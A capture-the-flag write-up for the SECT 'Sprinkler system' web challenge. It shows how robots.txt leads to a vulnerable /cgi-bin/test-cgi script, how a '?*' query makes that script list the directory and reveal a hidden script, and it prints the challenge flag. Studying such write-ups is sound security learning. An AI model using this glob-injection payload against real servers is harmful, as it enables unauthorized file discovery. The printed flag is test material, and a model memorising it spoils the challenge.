# Sprinkler system - Web

### Problem


Sprinkler system - Web (100 + 0)

Damn new york... some chick tricked you into standing in the rain on the very first day... it's payback time!

Solves: 238

Service: http://sprinklers.alieni.se/

Author: avlidienbrunn

flag: SECT{-p001_On_t3h_r00f_must_h@v3_A_l3ak!-}

When you first look at the web page it says not to turn on the sprinklers, but other than that the page doesn't have anything else of importance on it. 


When a web page doesn't have alot of information the first thing I look at is the robots.txt

http://sprinklers.alieni.se/robots.txt

```
User-agent: *
Disallow: /cgi-bin/test-cgi
```

http://sprinklers.alieni.se/cgi-bin/test-cgi

```
argc is 0. argv is .
SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)
SERVER_NAME = sprinklers.alieni.se
GATEWAY_INTERFACE = CGI/1.1
SERVER_PROTOCOL = HTTP/1.1
SERVER_PORT = 80
REQUEST_METHOD = GET
HTTP_ACCEPT = */*
PATH_INFO = /
PATH_TRANSLATED = /var/www/html/index.html
SCRIPT_NAME = /cgi-bin/test-cgi
QUERY_STRING =
REMOTE_HOST =
REMOTE_ADDR = 141.101.88.193
REMOTE_USER =
AUTH_TYPE =
CONTENT_TYPE =
CONTENT_LENGTH =
```

At first I was confused about what information this was giving me. Then I realized that it is a script that was run on the web server.

Once I figured that out I googled the script /cgi-bin/test-cgi the first link was:

http://insecure.org/sploits/test-cgi.html

The web site shows that there is a vulnerablity in the script 

http://sprinklers.alieni.se/cgi-bin/test-cgi?*

```
CGI/1.0 test script report:
argc is 1. argv is \*.
SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)
SERVER_NAME = sprinklers.alieni.se
GATEWAY_INTERFACE = CGI/1.1
SERVER_PROTOCOL = HTTP/1.1
SERVER_PORT = 80
REQUEST_METHOD = GET
HTTP_ACCEPT = */*
PATH_INFO = 
PATH_TRANSLATED = 
SCRIPT_NAME = /cgi-bin/test-cgi
QUERY_STRING = enable_sprinkler_system test-cgi
REMOTE_HOST =
REMOTE_ADDR = 172.68.102.79
REMOTE_USER =
AUTH_TYPE =
CONTENT_TYPE =
CONTENT_LENGTH
```

You can see that there is another script in the /cgi-bin/ directory called enable_sprinkler

http://sprinklers.alieni.se/cgi-bin/enable_sprinkler

You get the flag

SECT{-p001_On_t3h_r00f_must_h@v3_A_l3ak!-}
